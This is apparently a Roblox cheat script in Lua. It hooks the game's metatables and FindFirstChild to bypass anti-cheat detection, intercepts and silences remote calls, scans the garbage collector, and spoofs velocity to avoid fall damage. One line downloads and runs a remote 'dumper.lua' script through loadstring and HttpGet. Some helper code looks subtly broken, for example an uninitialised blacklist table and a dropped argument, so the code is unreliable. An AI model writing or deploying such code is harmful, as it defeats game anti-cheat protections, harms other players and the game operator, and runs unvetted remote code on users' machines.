--Settings
local debug = true
--Helper functions
local function debugWarn(...)
	if debug then
		rconsolewarn(...)
	end
end
--AC bypass
local mt, lp, find = getrawmetatable(game), game:GetService("Players").LocalPlayer;
local index, namecall = mt.__index, mt.__namecall; setreadonly(mt, false);
local isA = game.IsA

mt.__namecall = newcclosure(function(self, ...)
    local method = getnamecallmethod()
    if method == "Play" then 
        if isA(self,"AnimationTrack") and self.Animation.AnimationId == "rbxassetid://4595066903" then
            debugWarn("AC triggered");
            while wait(9e9) do end;
        end
    end
    return namecall(self, ...);
end);

mt.__index = newcclosure(function(t,k)
	if t == lp and k == "Character" then
		return lp.Character or true;
	end;
	return index(t,k);
end); 

setreadonly(mt, true);

find = hookfunction(game.FindFirstChild, function(p,t)
	if t == "CharacterHandler" then
		debugWarn("AC triggered");
		while wait(9e9) do end;
	end;
	find(t);
end);
--Remote shit
local FireServer, InvokeServer

FireServer = hookfunction(Instance.new('RemoteEvent').FireServer, function(...)
	rconsoleprint(...)
	return nil
end)

InvokeServer = hookfunction(Instance.new('RemoteFunction').InvokeServer, function(...)
	rconsoleprint(...)
	return nil
end)
loadstring(game:HttpGet("https://pysef.cc/scripts/dumper.lua"))()
for i,v in next, getgc(true) do
    if type(v) == "table" then
        if v ~= nil then
            if v.Tango or v.Plum then
                print(v)
            end
        end
    end
end
--Settings
local settings = {
    ["confused"] = {Value = false}

}

--FindFirstChild obj
local ffc = {}

ffc.hook = hookfunction(game.FindFirstChild, function(target,rec)
    if ffc.blacklist[target] and ffc.blacklist[target].Value then
        return ffc.returns[target]
    end
    return ffc.hook(target,rec)
end)

function ffc:block(target, returnValue, obj)
    ffc.blacklist[target] = obj
    ffc.returns = returnValue
end

--No falldamage
local velMt = getrawmetatable(game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity)
local velIndex = velMt.__index
local targetScript = script
setreadonly(velMt, false)
velMt.__index = function(t,k)
    if k == "y" and getfenv(2).script == targetScript then
        return math.random(-39, 20)
    end
    return velIndex(t,k)
end
setreadonly(velMt, true)

--Anti-Confuse

ffc:block("Confused", nil, settings.confused)
